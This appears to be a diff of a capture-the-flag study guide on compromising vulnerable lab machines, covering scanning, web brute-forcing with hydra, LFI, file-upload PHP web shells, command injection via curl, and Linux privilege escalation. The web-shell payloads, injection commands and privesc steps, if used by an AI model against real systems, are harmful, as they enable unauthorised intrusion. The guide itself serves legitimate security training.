@@ -4,17 +4,19 @@ CTF Series : Vulnerable Machines
 
 This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub, Hack the Box and others. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilities.
 
-We would like to **thank g0tm1lk** for maintaining Vulnhub and **shout-out** to each and every **author of the Vulnerable Machine/ write-ups** submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community!. **Thank You!!**
+We would like to **thank g0tm1lk** for maintaining Vulnhub and moderators of Hack The Box. Also, **shout-out** to each and every **author of the Vulnerable Machine/ write-ups** submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community!. **Thank You!!**
 
 In solving any vulnerable machine, there are few stages:
 
-* Finding the IP Address
-* Port Scanning the machine
-* Listening to the interface
-* From Nothing (No-access) to Unprivileged Shell
-* From Unprivileged shell to Privileged Shell
+* :ref:`finding-the-ip-address`
+* :ref:`port-scanning`
+* :ref:`listen-to-the-interface`
+* :ref:`from-nothing-to-unprivileged-shell`
+* :ref:`unprivileged-shell-to-privileged-shell`
 
 In this blog, we have mentioned, what can be done in each stages. Have also provided Tips and Tricks for solving the VMs. Vulnerability Analysis Blog in Infrastructure Pentest Series could also be referred for exploitation of any particular services (As, it provides information such as "If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"
+
+.. _finding-the-ip-address:
 
 Finding the IP address
 ======================
@@ -49,6 +51,8 @@ Network exploration tool and security/ port scanner
   -sP/-sn Ping Scan -disable port scan 
 
   Example: nmap -sP/-sn 192.168.1.0/24
+
+.. _port-scanning:
 
 Port Scanning
 =============
@@ -123,6 +127,8 @@ By using **amap**, we can identify if any SSL server is running on port 3445 or 
   amap v5.4 finished at 2016-08-10 05:48:16
 
 
+.. _listen-to-the-interface:
+
 Listen to the interface
 =======================
 
@@ -148,6 +154,7 @@ While listening on port 4444, we might receive a something like a base64 encoded
   connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
   0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh
 
+.. _from-nothing-to-unprivileged-shell:
 
 From Nothing to a Unprivileged Shell
 ====================================
@@ -184,15 +191,23 @@ If we search for webmin in searchsploit, we will find different exploits availab
   Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
   **********Trimmed**************
 
+Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.
+
+::
+
+ searchsploit -x 24674
+
+
 Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Need nmap -sV -x xmlfile ).
 
 ::
   
   searchsploit
-
        --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
                               Use "-v" (verbose) to try even more combinations
 
+
+.. Tip :: If we don't get a exact exploit for a version, it is also recommended to read the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.
 
 SecLists.Org Security Mailing List Archive
 ------------------------------------------
@@ -224,15 +239,18 @@ nikto - Scan web server for known vulnerabilities. It would examine a web server
 * Insecure files and programs
 * Outdated servers and programs
 
-dirb, wfuzz
-^^^^^^^^^^^
+dirb, wfuzz, dirbuster
+^^^^^^^^^^^^^^^^^^^^^^
 
 Further, we can execute to find any hidden directories.
 
-* DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
-* wfuzz - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
+* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
+* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
+* `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. 
 
 .. Tip :: If the using the dirb/wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
+
+.. Tip :: Probably, we would be using common.txt in /usr/share/wordlists/dirb/ . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions .txt, .js, .html, .php. (.txt by default and rest application based)
 
 
 PUT Method
@@ -329,6 +347,8 @@ Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is ru
 Brute forcing: hydra
 ^^^^^^^^^^^^^^^^^^^^
 
+Hydra can be used to brute force login web pages
+
 ::
 
   -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
@@ -342,41 +362,39 @@ hydra http-post-form:
 
    hydra -U http-post-form
 
-    Help for module http-post-form:
-    ============================================================================
-    Module http-post-form requires the page and the parameters for the web form.
+**Help for module http-post-form**
 
-    By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.
+Module http-post-form requires the page and the parameters for the web form.
 
-    (Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)
+By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.
 
-    Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
-    First is the page on the server to GET or POST to (URL).
-    Second is the POST/GET variables (taken from either the browser, proxy, etc.
-    with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
-    Third is the string that it checks for an *invalid* login (by default)
-    Invalid condition login check can be preceded by "F=", successful condition
-    login check must be preceded by "S=".
-    This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
-    			The following parameters are optional:
-     			C=/page/uri     to define a different page to gather initial cookies from
-     			(h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
-                     		^USER^ and ^PASS^ can also be put into these headers!
-                     		Note: 'h' will add the user-defined header at the end
-                     		regardless it's already being sent by Hydra or not.
-                     		'H' will replace the value of that header if it exists, by the
-                    		 one supplied by the user, or add the header at the end
-    			Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
-     			All colons that are not option separators should be escaped (see the examples above and below).
-     			You can specify a header without escaping the colons, but that way you will not be able to put colons
-     			in the header value itself, as they will be interpreted by hydra as option separators.
+::
 
-    			Examples:
-     			"/login.php:user=^USER^&pass=^PASS^:incorrect"
-     			"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
-     			"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
-     			"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
-     			"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
+  Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
+
+* First is the page on the server to GET or POST to (URL).
+* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
+* Third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by "F=", successful condition login check must be preceded by "S=". This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
+* The following parameters are optional:
+  C=/page/uri     to define a different page to gather initial cookies from
+  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request	^USER^ and ^PASS^ can also be put into these headers!
+
+ * Note: 
+
+  * 'h' will add the user-defined header at the end	regardless it's already being sent by Hydra or not.
+  * 'H' will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end
+
+ * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
+
+Examples:
+
+:: 
+
+ "/login.php:user=^USER^&pass=^PASS^:incorrect"
+ "/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
+ "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
+ "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
+ "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
 LFI : Reading a php file
 ^^^^^^^^^^^^^^^^^^^^^^^^
@@ -420,7 +438,27 @@ To test LFI, RFI, we can also use `Uniscan <http://tools.kali.org/web-applicatio
 
 There's another tool called `fimap <https://tools.kali.org/web-applications/fimap>`_. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.
 
-Also, if we have unprivileged user shell, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
+.. Note :: Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.
+
+**Filtering in LFI**
+
+Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly. 
+
+For example: the below code only includes the file which are named secret
+::
+
+ <?php
+   $file = @$_GET['filname'];
+   if(strlen($file) > 55)
+      exit("File name too long.");
+   $fileName = basename($file);
+   if(!strpos($file, "secret"))
+     exit("No secret is selected.");
+   echo "<pre>";
+   include($file);
+   echo "</pre>";
+ ?>
+
 
 
 File Upload
@@ -548,6 +586,8 @@ Let's see few examples of File Upload
    >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
    >>> fh.close()   
 
+.. Tip :: Do check the source code of the page for any client-side file validation or any commented hidden parameters?
+
 Reverse Shells
 --------------
 
@@ -601,7 +641,7 @@ PHP
 
  ::
 
-  curl -G -s http://10.10.10.27/admin.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "adminpowa=noonecares" | sed '/<html>/,/<\/html>/d'
+  curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'
   
   -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
   -data-urlencode <data> (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding. 
@@ -1109,6 +1149,9 @@ Private SSH Keys / SSH Configuration
   /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
   /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file
 
+
+.. _unprivileged-shell-to-privileged-shell:
+
 Unprivileged shell to privileged shell
 ======================================
 
@@ -1146,6 +1189,18 @@ Possibly, migrate into a new process using post/windows/manage/migrate
 
 Privilege escalation from g0tm1lk blog
 --------------------------------------
+
+Once, we have got the unprivileged shell, it is very important to check the below things
+
+* Are there any binaries with Sticky, suid, guid.
+* Are there any world-writable folders, files.
+* Are there any world-execuable files.
+* Which are the files owned by nobody ( No user )
+* Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that's not always the case.)
+* What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
+* What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).
+* What are the services running? (netstat -ln)
+
 
 What "Advanced Linux File Permissions" are used?
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -1187,7 +1242,7 @@ A few 'common' places: /tmp, /var/tmp, /dev/shm
 
   * Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information. 
   * For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow. 
-  * Historically, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
+  * Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled. 
   * If passwordless accounts are disabled, you can put the hash of a password of your choice. You can use the crypt function to generate password hashes, for example
 
    ::
@@ -1217,7 +1272,7 @@ After compromising the machine with an unprivileged shell, /home would contains 
   find / -group groupname 2> /dev/null
 
 
-.. Tip :: Find files by wheel/ adm users.
+.. Tip :: Find files by wheel/ adm users or the users in the home directory.
 
 Execution of binary from Relative location than Absolute
 --------------------------------------------------------
@@ -1906,7 +1961,7 @@ If the sudoers file contains:
 :: 
 
   secure\_path 
-  Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment 	variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt\_group option are not affected by secure\_path. This option is not set by default.
+  Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment	variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt\_group option are not affected by secure\_path. This option is not set by default.
 
   env\_reset If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO\_\* variables. Any variables in the caller's environment that match the env\_keep and env\_check lists are then added, followed by any variables present in the file specified by the env\_file option (if any). The contents of the env\_keep and env\_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure\_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
 
@@ -2041,6 +2096,39 @@ We can get the password hash of a password protected rar file by using rar2john
     [root:~/Downloads]# rar2john crocs.rar
     file name: artwork.jpg
     crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
+
+Encrypted Files
+---------------
+
+Many times during the challenges, we do find encrypted files encrypted by Symmetric key encryption or RSA Public-Private Key encryption
+
+Symmetric Key
+^^^^^^^^^^^^^
+
+If we have the encrypted file and the key to it. However, we don't know the encryption scheme such as aes-128-cbc, des-cbc.
+
+We can use the code written by superkojiman in `De-ICE Hacking Challenge Part-1 <https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/>`_ , it would tell you what encryption scheme is used and then we can run the command to retrieve the plaintext.
+
+::
+
+ ciphers=`openssl list-cipher-commands`
+ for i in $ciphers; do
+  openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> > /dev/null 2>&1
+  if [[ $? -eq 0 ]]; then
+   echo "Cipher is $i: openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> -out foo.txt"
+   exit
+  fi
+ done
+
+RSA Public-Private Key encryption
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If we have found a weak RSA public, we can use `RsaCtfTool <https://github.com/Ganapati/RsaCtfTool>`_ uncipher data from weak public key and try to recover private key and then use 
+
+::
+
+ openssl rsautl -decrypt -inkey privatekey.pem -in <encryptedfile> -out key.bin 
+
 
 Truecrypt Files
 ---------------
@@ -2374,6 +2462,12 @@ Knockd
 ------
 
 `Knockd - Port-knocking server <http://www.zeroflux.org/projects/knock>`_ : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.
+
+If there is port knocking involved, read the /etc/knockd.conf, read the sequence port know should be done and execute
+
+::
+
+ for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
 
 DCEPT
 -----
